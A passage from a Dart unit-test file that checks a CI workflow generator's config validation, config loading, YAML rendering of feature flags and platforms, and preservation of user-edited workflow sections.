        'cross-validation: web_test config present but feature disabled produces error',
        () {
          final errors = WorkflowGenerator.validate(
            _validConfig(
              features: {'proto': false, 'lfs': false, 'web_test': false},
              webTest: {
                'concurrency': 2,
                'paths': ['test/web/'],
              },
            ),
          );
          expect(
            errors,
            anyElement(
              contains(
                'web_test config is present but ci.features.web_test is not enabled',
              ),
            ),
          );
        },
      );

      test(
        'cross-validation: web_test feature enabled but config wrong type produces error',
        () {
          final config = _validConfig(
            features: {'proto': false, 'lfs': false, 'web_test': true},
          );
          config['web_test'] = 'yes';
          final errors = WorkflowGenerator.validate(config);
          expect(errors, anyElement(contains('web_test must be an object')));
        },
      );

      test(
        'cross-validation: web_test feature enabled with no config object (null) is allowed, uses defaults',
        () {
          final errors = WorkflowGenerator.validate(
            _validConfig(
              features: {'proto': false, 'lfs': false, 'web_test': true},
              // webTest: null (omitted) — config is optional when feature is enabled
            ),
          );
          expect(errors.where((e) => e.contains('web_test')), isEmpty);
        },
      );

      test(
        'cross-validation: web_test feature enabled with explicit null config is allowed',
        () {
          final config = _validConfig(
            features: {'proto': false, 'lfs': false, 'web_test': true},
          );
          config['web_test'] = null;
          final errors = WorkflowGenerator.validate(config);
          expect(errors.where((e) => e.contains('web_test')), isEmpty);
        },
      );
    });

    // ---- fully valid config produces no errors ----
    test('fully valid config produces no errors', () {
      final errors = WorkflowGenerator.validate(
        _validConfig(
          dartSdk: '3.9.2',
          features: {'proto': true, 'lfs': false, 'web_test': true},
          platforms: ['ubuntu', 'macos'],
          secrets: {'API_KEY': 'MY_SECRET'},
          pat: 'MY_PAT',
          lineLength: 120,
          subPackages: [
            <String, dynamic>{'name': 'core', 'path': 'packages/core'},
          ],
          runnerOverrides: {'ubuntu': 'custom-runner'},
          webTest: {
            'concurrency': 2,
            'paths': ['test/web/'],
          },
        ),
      );
      expect(errors, isEmpty);
    });

    // ---- multiple errors accumulate ----
    test('multiple errors are accumulated (not short-circuited)', () {
      final errors = WorkflowGenerator.validate(<String, dynamic>{
        // missing dart_sdk, missing features
      });
      expect(errors.length, equals(2));
      expect(errors, anyElement(contains('dart_sdk')));
      expect(errors, anyElement(contains('features')));
    });
  });

  // ===========================================================================
  // P0: loadCiConfig() tests
  // ===========================================================================
  group('WorkflowGenerator.loadCiConfig()', () {
    late Directory tempDir;

    setUp(() {
      tempDir = Directory.systemTemp.createTempSync('wf_gen_test_');
    });

    tearDown(() {
      tempDir.deleteSync(recursive: true);
    });

    test('returns null when config.json does not exist', () {
      final result = WorkflowGenerator.loadCiConfig(tempDir.path);
      expect(result, isNull);
    });

    test('returns null when config.json exists but has no "ci" key', () {
      final configDir = Directory('${tempDir.path}/.runtime_ci')..createSync();
      File(
        '${configDir.path}/config.json',
      ).writeAsStringSync(json.encode({'repo_name': 'test_repo'}));
      final result = WorkflowGenerator.loadCiConfig(tempDir.path);
      expect(result, isNull);
    });

    test('returns the ci map when config.json has a valid "ci" section', () {
      final configDir = Directory('${tempDir.path}/.runtime_ci')..createSync();
      File('${configDir.path}/config.json').writeAsStringSync(
        json.encode({
          'ci': {
            'dart_sdk': '3.9.2',
            'features': {'proto': true},
          },
        }),
      );
      final result = WorkflowGenerator.loadCiConfig(tempDir.path);
      expect(result, isNotNull);
      expect(result, isA<Map<String, dynamic>>());
      expect(result!['dart_sdk'], equals('3.9.2'));
      expect((result['features'] as Map)['proto'], isTrue);
    });

    test('throws StateError on malformed JSON', () {
      final configDir = Directory('${tempDir.path}/.runtime_ci')..createSync();
      File(
        '${configDir.path}/config.json',
      ).writeAsStringSync('{ not valid json');
      expect(
        () => WorkflowGenerator.loadCiConfig(tempDir.path),
        throwsA(
          isA<StateError>().having(
            (e) => e.message,
            'message',
            contains('Malformed JSON'),
          ),
        ),
      );
    });

    test('throws StateError when "ci" is not a Map', () {
      final configDir = Directory('${tempDir.path}/.runtime_ci')..createSync();
      File(
        '${configDir.path}/config.json',
      ).writeAsStringSync(json.encode({'ci': 'not_a_map'}));
      expect(
        () => WorkflowGenerator.loadCiConfig(tempDir.path),
        throwsA(
          isA<StateError>().having(
            (e) => e.message,
            'message',
            contains('object'),
          ),
        ),
      );
    });

    test('throws StateError when "ci" is a list instead of a map', () {
      final configDir = Directory('${tempDir.path}/.runtime_ci')..createSync();
      File('${configDir.path}/config.json').writeAsStringSync(
        json.encode({
          'ci': [1, 2, 3],
        }),
      );
      expect(
        () => WorkflowGenerator.loadCiConfig(tempDir.path),
        throwsA(isA<StateError>()),
      );
    });
  });

  // ===========================================================================
  // P0: render() — validation guard and web_test output integration tests
  // ===========================================================================
  group('WorkflowGenerator.render()', () {
    Map<String, dynamic> _minimalValidConfig({
      bool webTest = false,
      Map<String, dynamic>? webTestConfig,
      Map<String, dynamic>? featureOverrides,
      List<String>? platforms,
    }) {
      final features = <String, dynamic>{
        'proto': false,
        'lfs': false,
        'format_check': false,
        'analysis_cache': false,
        'managed_analyze': false,
        'managed_test': false,
        'build_runner': false,
        'web_test': webTest,
      };
      if (featureOverrides != null) {
        features.addAll(featureOverrides);
      }
      features['web_test'] = webTest;
      return _validConfig(
        dartSdk: '3.9.2',
        features: features,
        platforms: platforms ?? ['ubuntu'],
        webTest: webTestConfig,
      );
    }

    // ---- render() validation guard (defense-in-depth) ----
    test(
      'render throws StateError when config is invalid (missing dart_sdk)',
      () {
        final gen = WorkflowGenerator(
          ciConfig: {'features': <String, dynamic>{}},
          toolingVersion: '0.0.0-test',
        );
        expect(
          () => gen.render(),
          throwsA(
            isA<StateError>().having(
              (e) => e.message,
              'message',
              allOf(
                contains('Cannot render with invalid config'),
                contains('dart_sdk'),
              ),
            ),
          ),
        );
      },
    );

    test(
      'render throws StateError when config has multiple validation errors',
      () {
        final gen = WorkflowGenerator(
          ciConfig: <String, dynamic>{},
          toolingVersion: '0.0.0-test',
        );
        expect(
          () => gen.render(),
          throwsA(
            isA<StateError>().having(
              (e) => e.message,
              'message',
              allOf(
                contains('Cannot render with invalid config'),
                contains('dart_sdk'),
                contains('features'),
              ),
            ),
          ),
        );
      },
    );

    test('render throws StateError when config has invalid web_test type', () {
      final gen = WorkflowGenerator(
        ciConfig: _validConfig(
          features: {'proto': false, 'lfs': false, 'web_test': true},
        )..['web_test'] = 'yes',
        toolingVersion: '0.0.0-test',
      );
      expect(
        () => gen.render(),
        throwsA(
          isA<StateError>().having(
            (e) => e.message,
            'message',
            allOf(
              contains('Cannot render with invalid config'),
              contains('web_test must be an object'),
            ),
          ),
        ),
      );
    });

    test('render succeeds on valid config', () {
      final gen = WorkflowGenerator(
        ciConfig: _minimalValidConfig(webTest: false),
        toolingVersion: '0.0.0-test',
      );
      final rendered = gen.render();
      expect(rendered, isNotEmpty);
      expect(rendered, contains('name:'));
    });

    test('web_test=false: rendered output does not contain web-test job', () {
      final gen = WorkflowGenerator(
        ciConfig: _minimalValidConfig(webTest: false),
        toolingVersion: '0.0.0-test',
      );
      final rendered = gen.render();
      expect(rendered, isNot(contains('web-test:')));
      expect(rendered, isNot(contains('dart test -p chrome')));
    });

    test(
      'web_test=true with omitted config uses default concurrency and no explicit paths',
      () {
        final gen = WorkflowGenerator(
          ciConfig: _minimalValidConfig(webTest: true),
          toolingVersion: '0.0.0-test',
        );
        final rendered = gen.render();
        expect(rendered, contains('web-test:'));
        expect(rendered, contains('dart test -p chrome'));
        expect(rendered, contains('--concurrency=1'));
        expect(rendered, isNot(contains("'test/")));
      },
    );

    test('web_test=true with paths: rendered output includes path args', () {
      final gen = WorkflowGenerator(
        ciConfig: _minimalValidConfig(
          webTest: true,
          webTestConfig: {
            'paths': ['test/web/foo_test.dart'],
            'concurrency': 2,
          },
        ),
        toolingVersion: '0.0.0-test',
      );
      final rendered = gen.render();
      expect(rendered, contains("'test/web/foo_test.dart'"));
      expect(rendered, contains('--concurrency=2'));
      expect(rendered, contains('-- \'test/web/foo_test.dart\''));
    });

    test(
      'web_test=true with concurrency at upper bound (32): rendered output uses 32',
      () {
        final gen = WorkflowGenerator(
          ciConfig: _minimalValidConfig(
            webTest: true,
            webTestConfig: {'concurrency': 32},
          ),
          toolingVersion: '0.0.0-test',
        );
        final rendered = gen.render();
        expect(rendered, contains('--concurrency=32'));
      },
    );

    test('rendered output parses as valid YAML with jobs map', () {
      final gen = WorkflowGenerator(
        ciConfig: _minimalValidConfig(),
        toolingVersion: '0.0.0-test',
      );
      final rendered = gen.render();
      final parsed = loadYaml(rendered) as YamlMap;
      final jobs = parsed['jobs'] as YamlMap;
      expect(jobs.containsKey('pre-check'), isTrue);
    });

    test('feature flags render expected snippets', () {
      final cases = <Map<String, String>>[
        {'feature': 'proto', 'snippet': 'Install protoc'},
        {'feature': 'lfs', 'snippet': 'lfs: true'},
        {'feature': 'format_check', 'snippet': 'auto-format:'},
        {'feature': 'analysis_cache', 'snippet': 'Cache Dart analysis'},
        {'feature': 'managed_analyze', 'snippet': 'runtime_ci_tooling:manage_cicd analyze'},
        {'feature': 'managed_test', 'snippet': 'runtime_ci_tooling:manage_cicd test'},
        {'feature': 'build_runner', 'snippet': 'Run build_runner'},
      ];

      for (final c in cases) {
        final feature = c['feature']!;
        final snippet = c['snippet']!;
        final gen = WorkflowGenerator(
          ciConfig: _minimalValidConfig(featureOverrides: {feature: true}),
          toolingVersion: '0.0.0-test',
        );
        final rendered = gen.render();
        expect(rendered, contains(snippet), reason: 'Feature "$feature" should render "$snippet".');
      }
    });

    test('build_runner=false omits build_runner step', () {
      final gen = WorkflowGenerator(
        ciConfig: _minimalValidConfig(featureOverrides: {'build_runner': false}),
        toolingVersion: '0.0.0-test',
      );
      final rendered = gen.render();
      expect(rendered, isNot(contains('Run build_runner')));
    });

    test('multi-platform render emits analyze + matrix test jobs', () {
      final gen = WorkflowGenerator(
        ciConfig: _minimalValidConfig(platforms: ['ubuntu', 'macos']),
        toolingVersion: '0.0.0-test',
      );
      final rendered = gen.render();
      final parsed = loadYaml(rendered) as YamlMap;
      final jobs = parsed['jobs'] as YamlMap;

      expect(jobs.containsKey('analyze'), isTrue);
      expect(jobs.containsKey('test'), isTrue);
      expect(jobs.containsKey('analyze-and-test'), isFalse);

      final testJob = jobs['test'] as YamlMap;
      final strategy = testJob['strategy'] as YamlMap;
      final matrix = strategy['matrix'] as YamlMap;
      final include = matrix['include'] as YamlList;
      expect(include.length, equals(2));
    });

    // ---- render(existingContent) / _preserveUserSections ----
    group('render(existingContent) preserves user sections', () {
      test('user section content is preserved when existingContent has custom lines in a user block', () {
        final gen = WorkflowGenerator(
          ciConfig: _minimalValidConfig(),
          toolingVersion: '0.0.0-test',
        );
        final base = gen.render();
        // Append a user block with content so extraction finds it (first occurrence is empty)
        const customBlock = '''
# --- BEGIN USER: pre-test ---
      - name: Custom pre-test step
        run: echo "user-added"
# --- END USER: pre-test ---
''';
        final existing = base + customBlock;
        final rendered = gen.render(existingContent: existing);
        expect(rendered, contains('Custom pre-test step'));
        expect(rendered, contains('user-added'));
        expect(rendered, contains('# --- BEGIN USER: pre-test ---'));
        expect(rendered, contains('# --- END USER: pre-test ---'));
      });

      test('CRLF normalization: existing content with \\r\\n still preserves sections', () {
        final gen = WorkflowGenerator(
          ciConfig: _minimalValidConfig(),
          toolingVersion: '0.0.0-test',
        );
        final base = gen.render();
        const customContent = '\r\n      - run: echo "crlf-test"\r\n';
        final existing = base.replaceFirst(
          '# --- BEGIN USER: pre-test ---\n# --- END USER: pre-test ---',
          '# --- BEGIN USER: pre-test ---$customContent# --- END USER: pre-test ---',
        );
        final rendered = gen.render(existingContent: existing);
        expect(rendered, contains('crlf-test'));
        expect(rendered, contains('# --- BEGIN USER: pre-test ---'));
      });

      test('multiple user sections preserve independently', () {
        final gen = WorkflowGenerator(
          ciConfig: _minimalValidConfig(),
          toolingVersion: '0.0.0-test',
        );
        final base = gen.render();
        var existing = base;
        existing = existing.replaceFirst(
          '# --- BEGIN USER: pre-test ---\n# --- END USER: pre-test ---',
          '# --- BEGIN USER: pre-test ---\n      - run: echo pre\n# --- END USER: pre-test ---',
        );
        existing = existing.replaceFirst(
          '# --- BEGIN USER: post-test ---\n# --- END USER: post-test ---',
          '# --- BEGIN USER: post-test ---\n      - run: echo post\n# --- END USER: post-test ---',
        );
        existing = existing.replaceFirst(
          '# --- BEGIN USER: extra-jobs ---\n# --- END USER: extra-jobs ---',
          '# --- BEGIN USER: extra-jobs ---\n  custom-job:\n    runs-on: ubuntu-latest\n# --- END USER: extra-jobs ---',
        );
        final rendered = gen.render(existingContent: existing);
        expect(rendered, contains('echo pre'));
        expect(rendered, contains('echo post'));
        expect(rendered, contains('custom-job:'));
        expect(rendered, contains('runs-on: ubuntu-latest'));
      });

      test('empty/whitespace-only existing user section does not overwrite rendered section', () {
        final gen = WorkflowGenerator(
          ciConfig: _minimalValidConfig(),
          toolingVersion: '0.0.0-test',
        );
        final base = gen.render();
        // Existing has pre-test with only whitespace; post-test has real content
        final existing = base
            .replaceFirst(
              '# --- BEGIN USER: pre-test ---\n# --- END USER: pre-test ---',
              '# --- BEGIN USER: pre-test ---\n   \n  \t  \n# --- END USER: pre-test ---',
            )
            .replaceFirst(
              '# --- BEGIN USER: post-test ---\n# --- END USER: post-test ---',
              '# --- BEGIN USER: post-test ---\n      - run: echo kept\n# --- END USER: post-test ---',
            );
        final rendered = gen.render(existingContent: existing);
        // pre-test: whitespace-only was skipped, so rendered keeps empty placeholder
        expect(
          rendered,
          contains('# --- BEGIN USER: pre-test ---\n# --- END USER: pre-test ---'),
        );
        // post-test: real content was preserved
        expect(rendered, contains('echo kept'));
      });
    });
  });
}
